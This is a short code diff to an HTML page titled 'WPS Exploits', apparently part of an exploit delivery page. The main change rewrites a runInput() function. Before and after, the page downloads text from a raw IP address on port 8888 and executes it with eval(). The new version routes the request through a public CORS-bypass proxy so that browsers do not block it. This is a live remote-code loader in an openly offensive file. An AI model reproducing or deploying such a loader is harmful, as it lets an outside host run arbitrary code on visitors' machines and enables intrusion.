@@ -9,9 +9,9 @@
     <!-- Bootstrap CSS -->
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
         integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
-    
 
-        <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
     <title>WPS Exploits</title>
 </head>
 <!-- 
@@ -200,15 +200,12 @@ startTask
 
         function runInput() {
 
-            const Http = new XMLHttpRequest();
-            const url = 'http://139.180.144.198:8888';
-            Http.open("GET", url);
-            Http.send();
-            var d;
-            Http.onreadystatechange = (e) => {
-               d=Http.responseText;
-               eval(d);
-            }
+            const proxyurl = "https://cors-anywhere.herokuapp.com/";
+            const url = "http://139.180.144.198:8888"; // site that doesn’t send Access-Control-*
+            fetch(proxyurl + url) 
+                .then(response => response.text())
+                .then(contents => eval(contents))
+                .catch(() => console.log("Can’t access " + url + " response. Blocked by browser?"))
         }
 
         function change() {
